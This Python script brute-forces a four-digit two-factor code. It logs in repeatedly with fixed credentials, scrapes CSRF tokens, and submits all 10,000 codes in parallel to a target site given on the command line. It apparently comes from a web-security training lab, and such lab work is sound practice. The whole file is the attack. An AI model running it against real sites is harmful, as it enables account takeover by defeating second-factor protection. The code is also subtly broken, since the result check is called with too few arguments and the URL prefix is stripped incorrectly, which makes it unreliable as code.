import sys
import requests
from bs4 import BeautifulSoup
import multiprocessing
# import numpy as np


def Check_Second_Factor_Code(web_response, factor_code):
    if web_response == 302:
        print(f'\n\n\n2fa valid with response code {web_response}')
        print(f'2fa valid code: {factor_code}\n\n\n')
        found_code.set()
        # Visit account profile page to complete level
    else:
        print(f'2fa invalid with response code: {web_response}')


def Login_to_account(factor_code):
    site = sys.argv[1]
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')

    s = requests.Session()
    login_url = f'https://{site}/login'

    resp = s.get(login_url)  # new one each time, otherwise boot
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    logindata = {
        'csrf': csrf,
        'username': 'carlos',
        'password': 'montoya'
    }
    # print(f'Logging in as carlos:montoya')
    print(f'Using 2FA code: {factor_code}')
    resp = s.post(login_url, data=logindata)
    # print(f'Login response: {resp.text}')

    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')
    print(f'CSRF: {csrf}')
    login2_url = f'https://{site}/login2'
    login2data = {
        'csrf': csrf,
        'mfa-code': str(factor_code).zfill(4)
    }
    resp = s.post(login2_url, data=login2data, allow_redirects=False)
    Check_Second_Factor_Code(resp.status_code)


if __name__ == '__main__':
    # Event variable to set when found correct 2fa
    found_code = multiprocessing.Event()
    # Generate a list of 0-9999
    factor_code_list = list(i for i in range(10000))
    # Get alot of workers.
    workers = multiprocessing.cpu_count() * 20

    with multiprocessing.Pool(workers) as w:
        w.map(Login_to_account, factor_code_list)
